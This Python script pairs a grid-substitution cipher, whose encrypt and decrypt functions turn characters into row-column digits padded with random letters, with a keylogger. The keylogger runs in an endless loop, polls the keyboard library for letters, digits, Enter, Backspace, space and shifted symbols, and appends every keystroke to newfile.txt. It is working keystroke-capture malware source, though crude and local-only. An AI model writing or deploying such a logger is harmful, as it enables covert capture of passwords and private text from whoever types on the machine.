import random as r
import string
import keyboard
import time
key=[['a','b','c','d','e','f','.','+'],['g','h','i','j','k','l',',','_'],['m','n','o','p','q','r','/','>'],['s','t','u','v','w','x',':','<'],['y','z','1','2','3','4','-','?'],['5','6','7','8','9','0',')','`'],[' ','!','@','#','$','%','(','&'],['^','*','{','}','[',']','=',';']]
key2="abcdefghijklmnopqrstuvwxyz1234567890 "
list_of_asc=list(key2)

def encrypt(text):
    enc=""
    text=text.lower()
    #text=input("Enter Text To Encrypt:")
    l=[]
    for i in text:
        l.append(i)

    for i in l:
        for j in range(len(key)):
            if i in key[j]:
                row=str(j+1)
                new=key[j]
                for x in range(len(new)):
                    if i==new[x]:
                        col=str(x+1)
                        q=r.randint(0,1)
                        if q:
                            s=r.randint(0,25)
                            st=key2[s]
                        else:
                            st=""
                    else:
                        pass
                enc+=(row+col+st)
            
             
    return enc

def decrypt(text):
    text=str(text)
    text1=""
    dec=""
    l=[]
    for i in text:
        if i.isalpha():
            pass
        else:
            text1+=i
    for i in range(0,len(text1),2):
        l.append(text1[i]+text1[i+1])
    #for i in range(len(l)):
    #    l[i]=int(l[i])
    for i in l:
        x=int(i[0])-1
        y=int(i[1])-1
        list1=key[x]
        val=list1[y]
        dec+=val

    return dec
hm=["enter","backspace","spacebar","shift+1","shift+2","shift+3","shift+4","shift+5","shift+6","shift+7","shift+8","shift+9","shift+0"]
nohm=[".","-","="]
dict1={"shift+1":"!","shift+2":"@","shift+3":"#","shift+4":"$","shift+5":"%","shift+6":"^","shift+7":"&","shift+8":"*","shift+9":"(","shift+0":")"}
list_of_asc.extend(hm)
list_of_asc.extend(nohm)
print(list_of_asc)
def keylog():
    for i in list_of_asc:
        if keyboard.is_pressed(i):
            with open("newfile.txt","a") as f:

                if i not in hm:
                    f.write(i)
                    time.sleep(0.1)
                    return 0
                elif i=="enter":
                    f.write("\n")
                    time.sleep(0.1)
                    return 0
                elif i=="spacebar":
                    f.write(" ")
                    time.sleep(0.1)
                    return 0
                elif i=="backspace":
                    with open("newfile.txt", "r") as f1:
                        zx=list(f1.read())
                        zx.pop()
                    with open("newfile.txt", "w") as f1:
                        f1.write("")
                    new_z=""
                    for i in zx:
                        new_z+=i
                    f.write(new_z)
                    time.sleep(0.1)
                    return 0
                elif i in dict1.keys():
                    f.write(dict1[i])
                    time.sleep(0.1)
                    return 0
#print(list_of_asc)
list_of_asc.extend(["backspace","enter","spacebar"])
while True:
    keylog()
